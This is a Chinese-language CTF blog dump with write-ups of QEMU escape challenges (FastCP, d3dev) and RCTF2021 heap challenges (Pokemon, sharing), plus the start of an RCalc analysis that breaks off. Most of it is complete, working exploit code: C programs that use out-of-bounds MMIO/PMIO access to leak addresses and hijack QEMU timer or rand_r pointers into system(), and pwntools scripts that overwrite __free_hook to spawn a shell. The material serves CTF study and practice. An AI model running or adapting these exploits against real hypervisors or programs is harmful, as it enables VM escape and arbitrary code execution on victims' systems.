cpu_physical_memory_rw(cp_info.CP_dst, opaque-&gt;CP_buffer, cp_info.CP_cnt, 1);// write        v6 = opaque-&gt;cp_state.cmd &amp; 0xFFFFFFFFFFFFFFF8LL;        opaque-&gt;cp_state.cmd = v6;LABEL_11:        if ( (v6 &amp; 8) != 0 )        &#123;          opaque-&gt;irq_status |= 0x100u;          if ( msi_enabled(&amp;opaque-&gt;pdev) )            msi_notify(&amp;opaque-&gt;pdev, 0);          else            pci_set_irq(&amp;opaque-&gt;pdev, 1);        &#125;        goto LABEL_16;      &#125;      break;    case 1uLL:      CP_list_cnt = opaque-&gt;cp_state.CP_list_cnt;      opaque-&gt;handling = 1;      if ( CP_list_cnt &gt; 0x10 )      &#123;LABEL_22:        v8 = 0LL;        do        &#123;          v9 = 3 * v8++;          cpu_physical_memory_rw(opaque-&gt;cp_state.CP_list_src + 8 * v9, &amp;cp_info, 0x18uLL, 0);          cpu_physical_memory_rw(cp_info.CP_src, opaque-&gt;CP_buffer, cp_info.CP_cnt, 0);          cpu_physical_memory_rw(cp_info.CP_dst, opaque-&gt;CP_buffer, cp_info.CP_cnt, 1);        &#125;        while ( opaque-&gt;cp_state.CP_list_cnt &gt; v8 );      &#125;      else      &#123;        if ( !CP_list_cnt )        &#123;LABEL_10:          v6 = cmd &amp; 0xFFFFFFFFFFFFFFFELL;          opaque-&gt;cp_state.cmd = v6;          goto LABEL_11;        &#125;        v3 = 0LL;        v4 = 0LL;        while ( 1 )        &#123;          cpu_physical_memory_rw(v3 + opaque-&gt;cp_state.CP_list_src, buf, 0x18uLL, 0);          if ( v12 &gt; 0x1000 )            break;          v5 = opaque-&gt;cp_state.CP_list_cnt;          ++v4;          v3 += 24LL;          if ( v4 &gt;= v5 )          &#123;            if ( !v5 )              break;            goto LABEL_22;          &#125;        &#125;      &#125;      cmd = opaque-&gt;cp_state.cmd;      goto LABEL_10;    default:      return;  &#125;  opaque-&gt;cp_state.cmd = 0LL;LABEL_16:  opaque-&gt;handling = 0;&#125;\n\n在timer中存在三个由cmd属性控制的分支，这里直接说三个分支的功能：\n\n  opaque-&gt;cp_state.cmd = 2; 从opaque-&gt;cp_state.CP_list_src读取内容到栈上，通过( cp_info.CP_cnt &lt;= 0x1000 )验证之后再将cp_info.CP_src内容读取到opaque-&gt;CP_buffer上。\n  opaque-&gt;cp_state.cmd = 4; 从opaque-&gt;cp_state.CP_list_src读取内容到栈上，未通过任何验证，直接将opaque-&gt;CP_buffer写到cp_info.CP_dst上\n  opaque-&gt;cp_state.cmd = 1; 从opaque-&gt;cp_state.CP_list_src + 8 * v9读取内容到栈上，未通过任何验证，将cp_info.CP_src读取到opaque-&gt;CP_buffer上，再将opaque-&gt;CP_buffer写到cp_info.CP_dst上。\n\n00000000 FastCPState struc ; (sizeof=0x1A30, align=0x10, copyof_4530)00000000 pdev PCIDevice_0 ?000008F0 mmio MemoryRegion_0 ?000009E0 cp_state CP_state ?000009F8 handling db ?000009F9 db ? ; undefined000009FA db ? ; undefined000009FB db ? ; undefined000009FC irq_status dd ?00000A00 CP_buffer db 4096 dup(?)00001A00 cp_timer QEMUTimer_0 ?00001A30 FastCPState ends  00000000 QEMUTimer_0 struc ; (sizeof=0x30, align=0x8, copyof_1181)00000000                                         ; XREF: FastCPState/r00000000 expire_time dq ?00000008 timer_list dq ?                         ; offset00000010 cb dq ?                                 ; offset00000018 opaque dq ?                             ; offset00000020 next dq ?                               ; offset00000028 attributes dd ?0000002C scale dd ?00000030 QEMUTimer_0 ends\n\n结合上述结构体再加上上面的分析结果漏洞已经呼之欲出了。因为情况2和3中没有对len进行验证导致可以越界使用结构体产生的漏洞。\n利用分析因为漏洞点较为简单，所以利用方式也比较简单\n\n  首先通过情况2越界读取到cp_timer成员中的内容。该成员中cb的值为fastcp_cp_timer函数的地址(在pci_FastCP_realize中完成赋值)，进而泄漏出system的地址。顺便泄漏出opaque成员地址。\n  通过情况3越界写入内容到cp_timer成员，劫持cb和opaque。\n  最后触发timer完成利用\n\n注意！！虽然利用方式特别简单，但是这道题目有一点是非常容易被忽略的。那就是物理地址连续不代表虚拟地址连续！\n在下面exp中，在第一次读取到cp_timer成员到内容后并没有使用*(unsigned long long *)(userbuf + 0x1010)来读取，因为程序中实际写入到函数是cpu_physical_memory_rw(cp_info.CP_dst, opaque-&gt;CP_buffer, cp_info.CP_cnt, 1);而这里写入到的是物理地址，但是物理地址并不连续，所以这里是读取不到的。所以最后往cp_timer成员写入的时候使用的也是va2pa(userbuf + 0x1000) - 0x1000写入。\n综上，exp#include &lt;assert.h&gt;#include &lt;fcntl.h&gt;#include &lt;inttypes.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/io.h&gt;#define PAGE_SHIFT 12#define PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)struct FastCP_CP_INFO&#123;    uint64_t CP_src;    uint64_t CP_cnt;    uint64_t CP_dst;&#125;;struct QEMUTimer&#123;    long long int expire_time;    unsigned long long timer_list;    unsigned long long cb;    void *opaque;    unsigned long long next;    int attributes;    int scale;    char command[0x50];&#125;;void die(const char *msg)&#123;    perror(msg);    exit(-1);&#125;size_t va2pa(void *addr)&#123;    uint64_t data;    int fd = open(&quot;/proc/self/pagemap&quot;, O_RDONLY);    if (!fd)    &#123;        perror(&quot;open pagemap&quot;);        return 0;    &#125;    size_t offset = ((uintptr_t)addr / PAGE_SIZE) * sizeof(uint64_t);    if (lseek(fd, offset, SEEK_SET) &lt; 0)    &#123;        puts(&quot;lseek&quot;);        close(fd);        return 0;    &#125;    if (read(fd, &amp;data, 8) != 8)    &#123;        puts(&quot;read&quot;);        close(fd);        return 0;    &#125;    if (!(data &amp; (((uint64_t)1 &lt;&lt; 63))))    &#123;        puts(&quot;page&quot;);        close(fd);        return 0;    &#125;    size_t pageframenum = data &amp; ((1ull &lt;&lt; 55) - 1);    size_t phyaddr = pageframenum * PAGE_SIZE + (uintptr_t)addr % PAGE_SIZE;    close(fd);    return phyaddr;&#125;char *userbuf;unsigned long long phy_userbuf;unsigned char *mmio_mem;int write_CP_list_cnt(unsigned long long value)&#123;    *((unsigned long long *)(mmio_mem + +0x10)) = value;&#125;int write_CP_list_src(unsigned long long value)&#123;    *((unsigned long long *)(mmio_mem + 8)) = value;&#125;int run_cmd(unsigned long long cmd, unsigned long long src, unsigned long long cnt)&#123;    write_CP_list_cnt(cnt);    write_CP_list_src(src);    *((unsigned long long *)(mmio_mem + +0x18)) = cmd;    sleep(1);&#125;int main()&#123;    int mmio_fd = open(&quot;/sys/bus/pci/devices/0000:00:04.0/resource0&quot;, O_RDWR | O_SYNC);    if (mmio_fd == -1)        die(&quot;mmio_fd open failed&quot;);    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);    if (mmio_mem == MAP_FAILED)        die(&quot;mmap mmio_mem failed&quot;);    printf(&quot;mmio_mem @ %p\\n&quot;, mmio_mem);    userbuf = mmap(0, 0x2000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);    if (userbuf == MAP_FAILED)        die(&quot;mmap&quot;);    mlock(userbuf, 0x2000);    phy_userbuf = va2pa(userbuf);    printf(&quot;user buff virtual address: %p\\n&quot;, userbuf);    printf(&quot;user buff physical address: %p\\n&quot;, (void *)phy_userbuf);    struct FastCP_CP_INFO info;    info.CP_src = NULL;    info.CP_dst = phy_userbuf;    info.CP_cnt = 0x1000 + 0x30;    memcpy(userbuf, &amp;info, sizeof(info));    run_cmd(4, phy_userbuf, 1);    info.CP_src = phy_userbuf + 0x1000;    info.CP_cnt = 0x30;    info.CP_dst = NULL;    memcpy(userbuf, &amp;info, sizeof(info));    run_cmd(2, phy_userbuf, 1);    info.CP_src = NULL;    info.CP_cnt = 0x30;    info.CP_dst = phy_userbuf;    memcpy(userbuf, &amp;info, sizeof(info));    run_cmd(4, phy_userbuf, 1);    printf(&quot;fastcp_cp_timer=&gt;%p\\n&quot;, *(unsigned long long *)(userbuf + 0x10));    printf(&quot;%p\\n&quot;, va2pa(userbuf + 0x1000));    printf(&quot;%p\\n&quot;, va2pa(userbuf + 0x2000));    unsigned long long fastcp_cp_timer = *(unsigned long long *)(userbuf + 0x10);    unsigned long long elf_base = fastcp_cp_timer - 0x4DCE80;    unsigned long long system_addr = elf_base + 0x2C2180;    unsigned long long opaque_addr = *(unsigned long long *)(userbuf + 0x18);    struct QEMUTimer timer;    timer.expire_time = 0xffffffffffffffff;    timer.timer_list = *(unsigned long long *)(userbuf + 0x8);    timer.cb = system_addr;    timer.opaque = opaque_addr + 0x1a30;    timer.next = *(unsigned long long *)(userbuf + 0x20);    timer.attributes = *(unsigned int *)(userbuf + 0x28);    timer.scale = *(unsigned int *)(userbuf + 0x2c);    strcpy(&amp;timer.command, &quot;cat /flag&quot;);    memcpy(userbuf + 0x1000, &amp;timer, sizeof(timer));    info.CP_src = va2pa(userbuf + 0x1000) - 0x1000;    info.CP_cnt = 0x1000 + 0x30 + 9;    info.CP_dst = va2pa(userbuf + 0x1000) - 0x1000;    for (int i = 0; i &lt; 0x11; i++)    &#123;        memcpy(userbuf + i * 0x18, &amp;info, sizeof(info));    &#125;    run_cmd(1, phy_userbuf, 0x11);    *((unsigned long long *)(mmio_mem + +0x18)) = 1;    return 0;&#125;\n\n\nd3dev先看看结构体\nstruct __attribute__((aligned(16))) d3devState&#123;  PCIDevice_0 pdev;  MemoryRegion_0 mmio;  MemoryRegion_0 pmio;  uint32_t memory_mode;  uint32_t seek;  uint32_t init_flag;  uint32_t mmio_read_part;  uint32_t mmio_write_part;  uint32_t r_seed;  uint64_t blocks[257];  uint32_t key[4];  int (*rand_r)(unsigned int *);&#125;;\n\n分析函数uint64_t __fastcall d3dev_mmio_read(d3devState *opaque, hwaddr addr, unsigned int size)&#123;  uint64_t v3; // rax  int v4; // esi  unsigned int v5; // ecx  uint64_t result; // rax  v3 = opaque-&gt;blocks[opaque-&gt;seek + (addr &gt;&gt; 3)];  v4 = 0xC6EF3720;  v5 = v3;  result = HIDWORD(v3);  do  &#123;    LODWORD(result) = result - ((v5 + v4) ^ (opaque-&gt;key[3] + (v5 &gt;&gt; 5)) ^ (opaque-&gt;key[2] + 16 * v5));    v5 -= (result + v4) ^ (opaque-&gt;key[1] + (result &gt;&gt; 5)) ^ (opaque-&gt;key[0] + 16 * result);    v4 += 0x61C88647;  &#125;  while ( v4 );  if ( opaque-&gt;mmio_read_part )  &#123;    opaque-&gt;mmio_read_part = 0;    return result;  &#125;  else  &#123;    opaque-&gt;mmio_read_part = 1;    return v5;  &#125;&#125;\n\nmmio_read函数这里，首先是根据seek和addr定位到数据，随后将数据进行tea解密，然后第一次输出低32位，第二次输出高32位。\nvoid __fastcall d3dev_mmio_write(d3devState *opaque, hwaddr addr, uint64_t val, unsigned int size)&#123;  __int64 v4; // rsi  ObjectClass **v5; // r11  uint64_t v6; // rdx  int v7; // esi  uint32_t v8; // r10d  uint32_t v9; // r9d  uint32_t v10; // r8d  uint32_t v11; // edi  unsigned int v12; // ecx  uint64_t v13; // rax  if ( size == 4 )  &#123;    v4 = opaque-&gt;seek + (addr &gt;&gt; 3);    if ( opaque-&gt;mmio_write_part )    &#123;      v5 = &amp;opaque-&gt;pdev.qdev.parent_obj.class + v4;      v6 = val &lt;&lt; 32;      v7 = 0;      opaque-&gt;mmio_write_part = 0;      v8 = opaque-&gt;key[0];      v9 = opaque-&gt;key[1];      v10 = opaque-&gt;key[2];      v11 = opaque-&gt;key[3];      v12 = v6 + *(v5 + 0x2B6);      v13 = (v5[0x15B] + v6) &gt;&gt; 32;      do      &#123;        v7 -= 0x61C88647;        v12 += (v7 + v13) ^ (v9 + (v13 &gt;&gt; 5)) ^ (v8 + 16 * v13);        LODWORD(v13) = ((v7 + v12) ^ (v11 + (v12 &gt;&gt; 5)) ^ (v10 + 16 * v12)) + v13;      &#125;      while ( v7 != 0xC6EF3720 );      v5[0x15B] = __PAIR64__(v13, v12);    &#125;    else    &#123;      opaque-&gt;mmio_write_part = 1;      opaque-&gt;blocks[v4] = val;    &#125;  &#125;&#125;\n\n在mmio_write函数中首先一样先通过seek和addr得到index，第一次使用时是直接在低32位写入输入的数据，后面的则是低32位和高32位进行tea加密随后写入到地址位置。\n// local variable allocation has failed, the output may be wrong!void __fastcall d3dev_pmio_write(d3devState *opaque, hwaddr addr, uint64_t val, unsigned int size)&#123;  uint32_t *key; // rbp  if ( addr == 8 )  &#123;    if ( val &lt;= 0x100 )      opaque-&gt;seek = val;  &#125;  else if ( addr &gt; 8 )  &#123;    if ( addr == 28 )    &#123;      opaque-&gt;r_seed = val;      key = opaque-&gt;key;      do        *key++ = (opaque-&gt;rand_r)(&amp;opaque-&gt;r_seed, 28LL, val, *&amp;size);      while ( key != &amp;opaque-&gt;rand_r );    &#125;  &#125;  else if ( addr )  &#123;    if ( addr == 4 )    &#123;      *opaque-&gt;key = 0LL;      *&amp;opaque-&gt;key[2] = 0LL;    &#125;  &#125;  else  &#123;    opaque-&gt;memory_mode = val;  &#125;&#125;\n\n这里不说pmio_read函数了，因为确实没啥用就不浪费篇幅了。这里看pmio_write函数，可以喊到在port等于28时会给r_seek赋值，并且会调用opaque-&gt;rand_r第一个参数就是opaque-&gt;r_seed的地址。而在addr等于8并且val小于0x100时则是往seek中写入值。可以看出来这里漏洞一样是存在越界使用结构体。\n利用分析这里的利用思路也是较为清晰的\n\n  首先修改seek配合addr实现使用mmio_write函数实现越界写，将opaque-&gt;rand_r原有的函数地址进行tea加密并且写入到当前位置。\n  两次调用mmio_read函数，分别读取opaque-&gt;rand_r高位和低位泄漏出libc地址，进而拿到system地址。\n  应为r_seek成员和blocks成员紧邻的缘故，恢复seek为0并通过addr在blocks成员开始位置写入flag\n  最后直接调用pmio_write并且port为28修改r_seed为nl /即可调用nl /flag\n\n综上，exp#include &lt;assert.h&gt;#include &lt;fcntl.h&gt;#include &lt;inttypes.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/io.h&gt;void die(const char *msg)&#123;    perror(msg);    exit(-1);&#125;char *userbuf;uint64_t phy_userbuf;unsigned char *mmio_mem;unsigned int port_base = 0xc040;void mmio_write(uint32_t addr, uint32_t value)&#123;    *((uint32_t *)(mmio_mem + addr)) = value;&#125;uint32_t mmio_read(uint32_t addr)&#123;    return *((uint32_t *)(mmio_mem + addr));&#125;void pmio_write(size_t port, u_int32_t val)&#123;    outl(val, port_base + port);&#125;size_t pmio_read(size_t port)&#123;    return inl(port_base + port);&#125;unsigned int key[4];size_t tea(size_t m)&#123;    uint64_t v3;    signed int v4;   // esi    unsigned int v5; // ecx    uint64_t result; // rax    v3 = m;    v4 = -957401312;    v5 = v3;    result = v3 &gt;&gt; 32;    do    &#123;        result = result - ((v5 + v4) ^ (key[3] + (v5 &gt;&gt; 5)) ^ (key[2] + 16 * v5));        v5 -= (result + v4) ^ (key[1] + ((unsigned int)result &gt;&gt; 5)) ^ (key[0] + 16 * result);        v4 += 1640531527;    &#125; while (v4);    printf(&quot;0x%lx\\n&quot;, v5);    printf(&quot;0x%lx\\n&quot;, result);    return result &lt;&lt; 32 | (u_int64_t)v5;&#125;int main()&#123;    int mmio_fd = open(&quot;/sys/bus/pci/devices/0000:00:03.0/resource0&quot;, O_RDWR | O_SYNC);    if (mmio_fd == -1)        die(&quot;mmio_fd open failed&quot;);    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);    if (mmio_mem == MAP_FAILED)        die(&quot;mmap mmio_mem failed&quot;);    if (iopl(3) != 0)    &#123;        puts(&quot;iopl fail!&quot;);        exit(-1);    &#125;    unsigned long long rand_r;    unsigned long long libc_base;    unsigned long long system_addr;    pmio_write(8, 0x100);    mmio_write(8, 0);    mmio_write(0x18, 0);    rand_r = mmio_read(0x18);    rand_r += ((unsigned long long)mmio_read(0x18)) &lt;&lt; 32;    libc_base = rand_r - 0x25d30;    system_addr = libc_base + 0x30290;    printf(&quot;%p\\n&quot;, rand_r);    key[0] = pmio_read(12);    key[1] = pmio_read(16);    key[2] = pmio_read(20);    key[3] = pmio_read(24);    for (int i = 0; i &lt; 4; i++)    &#123;        printf(&quot;key%d: %p\\n&quot;, i, key[i]);    &#125;    unsigned long long t_system_addr;    t_system_addr = tea(system_addr);    mmio_write(0x18, t_system_addr &amp; 0xffffffff);    mmio_write(0x18, t_system_addr &gt;&gt; 32);    pmio_write(8, 0);    mmio_write(0, 0x67616c66);    pmio_write(28, 0x2f206c6e);&#125;\n\n\n\n题目链接:    https://github.com/196082/196082/tree/main/qemu_escape\n","categories":["qemu escape"],"tags":["mmio","pmio"]},{"title":"RCTF2021复现","url":"/2022/04/10/RCTF2021%E5%A4%8D%E7%8E%B0/","content":"以前做pwn题比较在意的是利用方式以及利用原理，很少静下心来去逆向一个程序，也就导致我现在逆向能力相对来说很差，在遇到RCTF这种题目极其复杂的内容我可能就直接放弃了，然后比赛完就看别人wp，别人说了流程之后我就会想，这么简单我为什么当时不做呢？所以现在打算多多练题训练自己的逆向能力。\nPokemon流程分析main函数存在三个选项，第一就是创建chunk，创建的方式分为三种\nstruct chunk(Gold 3)0x1D0:&#123;\t888~908\t400~420&#125;struct chunk(Silver 2)0x210:&#123;\t666~676\t200~210&#125;struct chunk(Bronze 1)0x7f~0x380:&#123;\t23~23+(size/16)\tchunk_addr\tpasswd&#125;\n\n这是我推测出来的三个结构体。\n第二个选项就是对chunk进行一些行为，又分为三个，第一是释放chunk但是只允许类型为1的chunk被释放，第二个是show但是有一定的限制\nif ( memchr((a1 + 16), 0x7F, 8uLL)    || memchr((a1 + 16), 0x7E, 8uLL)    || strchr((a1 + 16), 0x55)    || strchr((a1 + 16), 0x56) )\n\n第三个选项就是修改内容，但是只可以修改一次并且类型1不能修改，类型2每个0x10才能修改，但是存在堆溢出，类型3可以修改0x10之后的内容大小为0x20\n然后就是main当中的第三个选项，这里首先就是比较你的两个chunk的值与Mewtwo作比较\nstruct Mewtwo:&#123;\t99999999\t6666666&#125;\n\n如果小于则会直接推出，如果大于就会进入下面\n__int64 __fastcall sub_3892(__int64 a1)&#123;  int i; // [rsp+14h] [rbp-Ch]  for ( i = 0; ; ++i )  &#123;    if ( i &gt; 1 )      return 0LL;    if ( *(a1 + 4 * (i + 16LL) + 8) == 1 &amp;&amp; *(*(a1 + 8 * (i + 6LL) + 8) + 0x10LL) )      break;  &#125;  if ( !dword_81F8 )  &#123;    printf(&quot;Please remember the password of the evolutionary gem: &quot;);    write(1, (*(a1 + 8 * (i + 6LL) + 8) + 0x10LL), 8uLL);    write(1, &quot;\\n&quot;, 1uLL);    dword_81F8 = 1;  &#125;  return 1LL;&#125;\n\n没有限制条件的write\nssize_t __fastcall sub_396E(__int64 a1)&#123;  ssize_t result; // rax  int i; // [rsp+10h] [rbp-10h]  int j; // [rsp+14h] [rbp-Ch]  for ( i = 0; i &lt;= 1; ++i )  &#123;    result = *(a1 + 4 * (i + 16LL) + 8);    if ( result == 1 )    &#123;      result = *(*(a1 + 8 * (i + 6LL) + 8) + 16LL);      if ( result )      &#123;        printf(&quot;Please give the evolution password: &quot;);        result = read(0, *(*(a1 + 8 * (i + 6LL) + 8) + 0x18LL), 0x30uLL);        for ( j = 0; j &lt;= 0x2F; ++j )        &#123;          result = *(*(a1 + 8 * (i + 6LL) + 8) + 0x18LL) + j;          *result ^= *(*(a1 + 8 * (i + 6LL) + 8) + j % 8 + 0x10LL);        &#125;        return result;      &#125;    &#125;  &#125;  return result;&#125;\n\n以及一个写入，这个写入是往chunk的0x18上的地址的值来写入。\n然后这里的free是存在一个小东西，就是如果chunk的0x10位置和0x18位置存在值就会free掉0x18位置的值。\n然后这里把游戏角色的结构体贴出来\nstruct role:&#123;\t\tname;0x20\t*(chunk+8)+=1000;0x28\t*(chunk)+=0;0x30\tremaining=1666;0x34\tcount;0x38\tchunk;0x48\texists/category;&#125;\n\n利用分析其实这道题就算是逆向完了也有点儿难想到利用方式，这里很烦的一点就是我们可以控制的内容太少了，但是由于题目给的read的地方都不能修改掉fd和bk那就肯定是存在overlapping，加上存在堆溢出可以很容易想到改变堆的大小，形成UAF。\n然后这里需要注意的一点就是当malloc的size大于small bin中的size且小于small bin当中的size+0x10就不会进行切块\n但是我觉得这应该不只是small bin当中的机制(我看源码只看了small bin的request所以其他的我也不确定)，后面有时间会试试在unsorted bin和large bin中是否成立。\n其实知道了这个知识点就很好利用了，因为如果按照固定思维的我们堆溢出无法修改掉size位，但是如果存在以上机制我们即可利用0x220来修改掉后面chunk的size了。\n综上，expfrom pwn import *r = process(&#x27;./Pokemon&#x27;)elf = ELF(&#x27;./Pokemon&#x27;)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)def create(category, size=0, idx=0):    r.recvuntil(b&#x27;Choice:&#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;Choice:&#x27;)    r.sendline(bytes(str(category), encoding=&#x27;utf8&#x27;))    if category == 1:        r.recvuntil(b&#x27;You will get a Pikachu. How big do you want it to be?&#x27;)        r.sendline(bytes(str(size), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;]&#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf8&#x27;))def delete(idx, need=False):    r.recvuntil(b&#x27;Choice:&#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;]&#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;Choice:&#x27;)    r.sendline(b&#x27;1&#x27;)    if need:        r.recvuntil(            b&#x27;This Pokemon is very valuable. Are you sure you want to release it? [Y/N]&#x27;        )        r.sendline(b&#x27;Y&#x27;)def edit(idx, content):    r.recvuntil(b&#x27;Choice:&#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;]&#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;Choice:&#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;You say: &#x27;)    r.send(content)def xor(payload, key):    res = &#x27;&#x27;    for i in range(len(payload)):        res += chr(payload[i] ^ key[i % 8])        print(hex(ord(res[len(res) - 1])))    return bytes(res, encoding=&#x27;ISO-8859-1&#x27;)r.recvuntil(b&#x27;Welcome to the Pokemon world, input your name: &#x27;)r.sendline(b&#x27;196082&#x27;)for i in range(7):    create(1, 0x220)    delete(0)    create(1, 0x300)    delete(0)    create(1, 0x310)    delete(0)create(1, 0x220)create(1, 0x300, 1)delete(0)create(1, 0x300)create(1, 0x300)create(1, 0x300)create(1, 0x300)delete(0)create(2)edit(0, p64(0xdeadbeef) * 16 * 2 + p64(0) + p64(0xc40 + 1))delete(1)delete(0, True)create(1, 0x300)create(1, 0x300, 1)delete(1)r.recvuntil(b&#x27;Choice:&#x27;)r.sendline(b&#x27;3&#x27;)r.recvuntil(b&#x27;]&#x27;)r.sendline(b&#x27;1&#x27;)create(1, 0x310, 1)r.recvuntil(b&#x27;Choice:&#x27;)r.sendline(b&#x27;3&#x27;)r.recvuntil(b&#x27;gem: &#x27;)main_arena_96 = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))print(hex(main_arena_96))r.recvuntil(b&#x27;[Y/N]&#x27;)r.sendline(b&#x27;N&#x27;)malloc_hook = (main_arena_96 &amp; 0xFFFFFFFFFFFFF000) + \\    (libc.symbols[&#x27;__malloc_hook&#x27;] &amp; 0xfff)libc_base = malloc_hook - libc.symbols[&#x27;__malloc_hook&#x27;]delete(1)create(1, 0x300, 0)create(3, idx=1)edit(1,     p8(0xaa) * 8 + p64(libc_base + libc.symbols[&#x27;__free_hook&#x27;] - 8) + b&#x27;\\n&#x27;)r.recvuntil(b&#x27;Choice:&#x27;)r.sendline(b&#x27;3&#x27;)r.recvuntil(b&#x27;[Y/N]&#x27;)r.sendline(b&#x27;Y&#x27;)r.recvuntil(b&#x27;Please give the evolution password: &#x27;)print(b&#x27;/bin/sh\\x00&#x27; + p64(libc_base + libc.symbols[&#x27;system&#x27;]))r.send(    xor(b&#x27;/bin/sh\\x00&#x27; + p64(libc_base + libc.symbols[&#x27;system&#x27;]),        p8(0xaa) * 8))delete(0)# gdb.attach(r)r.interactive()\n\nsharing相较于上一道题，这道题的难度可以说是十分简单，但是很烦的一点就是这道题目使用cpp写的，我对于cpp的逆向一直都不知道怎么入手，所以去问了大师傅，大师傅说对于cpp的逆向先是用ida搞清楚基本的功能，程序的特性利用动态调试来挖掘不过愚钝的我也不明白这道题到底是怎么想到create的idx相同时会free掉当前idx已存在的chunk，可能这就是经验积累吧。\n这道题知道了这样会free的话就很好做了这里就只贴exp了。\nfrom pwn import *elf = ELF(&#x27;./sharing&#x27;)r = process(&#x27;./sharing&#x27;)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)def create(idx, size):    r.sendlineafter(b&#x27;Choice: &#x27;, b&#x27;1&#x27;)    r.sendlineafter(b&#x27;Idx: &#x27;, bytes(str(idx), encoding=&#x27;utf8&#x27;))    r.sendlineafter(b&#x27;Sz: &#x27;, bytes(str(size), encoding=&#x27;utf8&#x27;))def move(from_idx, to_idx):    r.sendlineafter(b&#x27;Choice: &#x27;, b&#x27;2&#x27;)    r.sendlineafter(b&#x27;From: &#x27;, bytes(str(from_idx), encoding=&#x27;utf8&#x27;))    r.sendlineafter(b&#x27;To: &#x27;, bytes(str(to_idx), encoding=&#x27;utf8&#x27;))def show(idx):    r.sendlineafter(b&#x27;Choice: &#x27;, b&#x27;3&#x27;)    r.sendlineafter(b&#x27;Idx: &#x27;, bytes(str(idx), encoding=&#x27;utf8&#x27;))def edit(idx, content):    r.sendlineafter(b&#x27;Choice: &#x27;, b&#x27;4&#x27;)    r.sendlineafter(b&#x27;Idx: &#x27;, bytes(str(idx), encoding=&#x27;utf8&#x27;))    r.sendafter(b&#x27;Content: &#x27;, content)def hint(addr):    r.sendlineafter(b&#x27;Choice: &#x27;, bytes(str(0xdead), encoding=&#x27;utf8&#x27;))    r.sendlineafter(b&#x27;Hint: &#x27;, p32(0x2F767991) + p32(0) * 3)    r.sendlineafter(b&#x27;Addr: &#x27;, bytes(str(addr), encoding=&#x27;utf8&#x27;))create(0, 0x500)create(1, 0x500)create(0, 0x510)create(2, 0x500)show(2)main_arena_96 = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))print(hex(main_arena_96))malloc_hook = (main_arena_96 &amp; 0xFFFFFFFFFFFFF000) + \\    (libc.symbols[&#x27;__malloc_hook&#x27;] &amp; 0xfff)libc_base = malloc_hook - libc.symbols[&#x27;__malloc_hook&#x27;]create(3, 0x80)create(4, 0x80)create(3, 0x90)create(4, 0x90)create(5, 0x80)show(5)heap_addr = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))print(hex(heap_addr))heap_base = heap_addr - 0x145a0create(6, 0x10)create(7, 0x10)create(8, 0x10)create(7, 0x30)create(8, 0x30)target = heap_base + 0x14930for i in range(40):    hint(target)edit(6, p64(libc_base + libc.symbols[&#x27;__free_hook&#x27;]))hint(heap_base + 0x10)hint(heap_base + 0x10)create(9, 0x10)create(10, 0x10)create(11, 0x10)edit(11, p64(libc_base + libc.symbols[&#x27;system&#x27;]))edit(6, b&#x27;/bin/sh\\x00&#x27;)move(7, 6)# gdb.attach(r)r.interactive()\n\n\n剩下的题本来想复现musl了但是没有题目，然后就是其他题目我是真的要疯了，md全是cpp我属实需要下去再学习一段时间，后面复现D3的kernel。\n","categories":["比赛复现"],"tags":["chunk overlapping"]},{"title":"RCalc","url":"/2021/12/26/RCalc/","content":"检查保护今年冲50篇博客看来是悬了，这玩意数论是真要了我的老命了 : (\n是真被xctf搞无语了，有时候环境创建不了就不说，居然题目给的libc版本和解题需要的版本不一致，去问Gyan大神估计都觉得我是个傻逼了。。。\n\n只打开了nx\n流程分析__int64 __fastcall main(int a1, char **a2, char **a3)&#123;  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(stdout, 0LL, 2, 0LL);  setvbuf(stderr, 0LL, 2, 0LL);  sub_400A06();  alarm(0x78u);  sub_400FA2();  return 0LL;&#125;\n\nvoid *sub_400A06()&#123;  __int64 v0; // rbx  __int64 v1; // rbx  void *result; // rax  qword_6020F8 = malloc(0x10uLL);  if ( !qword_6020F8 )    exit(1);  qword_6020F0 = malloc(0x10uLL);  if ( !qword_6020F0 )    exit(1);  *qword_6020F8 = 0LL;  v0 = qword_6020F8;  *(v0 + 8) = malloc(0x100uLL);  *qword_6020F0 = 0LL;  v1 = qword_6020F0;  result = malloc(0x320uLL);  *(v1 + 8) = result;  return result;&#125;\n\n可以看到题目创建了几个chunk但是，注意一下chunk的创建顺序和结构就好\n__int64 sub_400FA2()&#123;  __int64 result; // rax  char v1[264]; // [rsp+0h] [rbp-110h] BYREF  __int64 v2; // [rsp+108h] [rbp-8h]  v2 = sub_400AAB();  printf(&quot;Input your name pls: &quot;);  __isoc99_scanf(&quot;%s&quot;, v1);  printf(&quot;Hello %s!\\nWelcome to RCTF 2017!!!\\n&quot;, v1);  puts(&quot;Let&#x27;s try our smart calculator&quot;);  sub_400E72();  result = sub_400B92();  if ( result != v2 )    sub_400BD4();  return result;&#125;\n\n这里存在一个栈溢出就是__isoc99_scanf(“%s”, v1);但是这里存在一个自主实现的canary保护\n__int64 sub_400AAB()&#123;  __int64 v0; // rbx  